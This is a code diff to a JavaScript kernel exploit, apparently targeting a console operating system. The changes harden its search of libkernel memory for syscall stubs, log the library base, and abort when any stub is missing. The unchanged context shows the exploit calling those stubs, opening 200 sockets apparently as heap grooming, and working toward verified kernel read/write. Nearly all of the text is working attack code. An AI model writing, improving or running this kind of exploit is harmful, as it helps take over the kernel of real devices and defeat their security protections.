@@ -1,4 +1,4 @@
-// kevent_krw_verify.js — full build, complete tail, R/W verification
+// kevent_krw_verify.js — hard-fail on stubs, widened scan
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
 
@@ -191,7 +191,7 @@ const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
-const EXPECTED_KBASE = 0xffffffffd5528000n; // updated from screenshot
+const EXPECTED_KBASE = 0xffffffffd5528000n;
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
@@ -228,6 +228,8 @@ function findStubRaw(snum) {
   const base = num(ctx().libkernelBase);
   const want = snum >>> 0;
   const LIMIT = 0x80000;
+  // Log base so we see what libkernelBase actually is
+  if (SCAN_SEEN === 0) log("NATIVES-BASE", "libkernelBase=" + h16(base));
   for (let off = 0; off < LIMIT; off += 4) {
     const w = p.read4(toI64(base + BigInt(off))) >>> 0;
     if ((w & 0x00ffffff) !== 0xc0c748) continue;
@@ -236,8 +238,10 @@ function findStubRaw(snum) {
     const b5 = p.read1(toI64(base + BigInt(off + 6)));
     const imm = (((w >>> 24) & 0xff) | (b3 << 8) | (b4 << 16) | (b5 << 24)) >>> 0;
     let isStub = false;
-    for (let k = 7; k <= 15; k++) {
-      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f && p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) { isStub = true; break; }
+    // Widened: 0F 05 anywhere in the next 32 bytes
+    for (let k = 7; k <= 32; k++) {
+      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f &&
+          p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) { isStub = true; break; }
     }
     if (!isStub) continue;
     SCAN_SEEN++;
@@ -274,17 +278,18 @@ function ensureStubs() {
   missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
   for (const k of missing) { const r = synthStub(NUM[k]); if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr)); else log("SYNTH-FAIL", k + ": " + r.err); }
   const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
+  // HARD FAIL: if even one stub is missing, we cannot proceed.
   if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
 }
 
 function scn(name, a, b, c, d, e, f) {
   const n = NUM[name]; const stub = ctx().stubAddr.get(n);
-  if (!stub) fin("stub missing: " + name + " (" + n + ")");
+  if (!stub) fin("stub missing at call: " + name + " (" + n + ")");
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
 }
 function scn64(name, a, b, c, d, e, f) {
   const n = NUM[name]; const stub = ctx().stubAddr.get(n);
-  if (!stub) fin("stub missing: " + name + " (" + n + ")");
+  if (!stub) fin("stub missing at call: " + name + " (" + n + ")");
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
 }
 
@@ -386,7 +391,7 @@ export async function runKevent(c) {
     HX.setKbase(STATE.kbase);
   }
 
-  ensureStubs();
+  ensureStubs(); // hard fails if it cannot find every syscall
 
   const burn = [];
   for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
